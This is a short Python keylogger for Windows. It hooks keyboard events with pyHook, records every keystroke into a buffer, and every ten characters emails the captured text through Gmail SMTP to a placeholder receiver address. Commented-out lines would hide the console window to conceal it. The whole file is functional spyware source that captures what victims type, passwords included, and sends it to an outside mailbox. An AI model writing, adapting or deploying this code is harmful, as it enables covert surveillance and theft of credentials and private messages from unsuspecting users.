import smtplib
import pyHook, pythoncom, sys, logging, win32console, win32api, win32gui, os

#win=win32console.GetConsoleWindow()
#win32gui.ShowWindow(win,0)

txt = ""

#emails file
def SendFile():
    global txt
    content = txt
    print(content)
    #print(type(txt))
    txt = ""
    mail = smtplib.SMTP('smtp.gmail.com',587)#587
    mail.ehlo()
    mail.starttls()
    #mail.ehlo()
    #sending email
    mail.login('SENDEREMAIL@gmail.com','PASSWORD')
    mail.sendmail('SENDEREMAIL@gmail.com','RECEIVER@gmail.com', content)
    txt = ""
    mail.close()
    
    #python = sys.executable
    #os.execl(python, python, * sys.argv)

#checks if ready to send / not very efficient
def Sendcheck():
    global txt
    nstring = len(txt)
    if nstring%10 == 0 and nstring != 0:
        SendFile()

#A little bit of formatting... very little
def OnKeyboardEvent(event):
    global txt
    if event.Ascii == 27:
        txt += "[ESC]"
    elif event.Ascii == 8:
        txt += "[Backspace]"
    elif event.Ascii == 0:
        txt += ""
    else:
        txt += chr(event.Ascii)
    Sendcheck()

#Collects keys
while True:
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

